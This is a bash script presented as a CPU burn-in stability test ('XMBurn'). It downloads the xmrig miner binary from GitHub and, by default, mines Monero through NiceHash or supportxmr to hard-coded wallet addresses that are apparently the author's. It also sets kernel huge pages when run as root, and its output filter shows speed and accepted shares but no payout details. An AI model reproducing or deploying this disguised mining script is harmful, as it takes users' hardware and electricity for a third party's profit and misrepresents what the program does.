#!/bin/bash

mag=$'\e[1;35m'
cyn=$'\e[1;36m'
white=$'\e[0m'
name=CPUTEST$RANDOM

#check for network connection, then check for and/or download xmrig binary
if  ! wget -q --spider http://github.com || ! wget -q --spider http://nicehash.com ; then
	echo Check internet connection.
	exit 1
fi
if [ ! -f "xmrig" ] ; then
  xmrig_url=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases | jq -r '.[] | .assets[] as $t | [$t.browser_download_url] | @tsv' | grep xenial | head -n 1)
  wget -q -O - $xmrig_url | tar --wildcards -xz xmrig*/xmrig --strip-components 1
fi

#This section defines wallets and pool URLs
case "$1" in
        nh)
            username="15ufDkou9LJrdWTizkVTkAeXTfFC7HT13t.$name"
	    url="randomxmonero.usa.nicehash.com:3380"
	    args="--coin="monero" --url=$url --user=$username --pass="x" --nicehash --randomx-1gb-pages --donate-level=40 --print-time=500 --av=0"
            ;;
	prv)
	    username="45ynYARcmKcLZrB1kEfjsbCcGByjVqsCnhzAgLpN1xjnTzxRRp8F7tq3bXbnrW929mdRcyBSAHNTzjHap4Wgbc8FTWRaut9"
	    url="pool.supportxmr.com:5555"
	    args="--coin="monero" --url=$url --user=$username --pass="$name" --randomx-1gb-pages --keepalive --donate-level=40 --print-time=500"
	    ;;
	update)
	  rm -f xmrig
	  ./xmburn.sh $2
	  exit 0
	  ;;
	"")
	  ./xmburn.sh nh
	  exit 0
	  ;;
        *)
	    echo ${cyn}XM${mag}Burn${white} - Stability test your system with Proof of Work cryptography...
	    echo -e ' \t github.com/davenport651/XMBurn '
	    echo 
            echo -e '\t' $"Usage: $0 {nh|prv|update}"
            exit 1
esac

echo $cyn This system is $name. $white
#echo $cyn $url $white
echo $mag Burn in progress... $white

#These two lines activate huge pages when run as root
core=`nproc --all`
sysctl -w vm.nr_hugepages=$core > /dev/null 2>&1

#Execute CPU burn-in test
./xmrig $args | egrep 'MEMORY|accepted|speed|(CPU.*AES)|esume|reject'
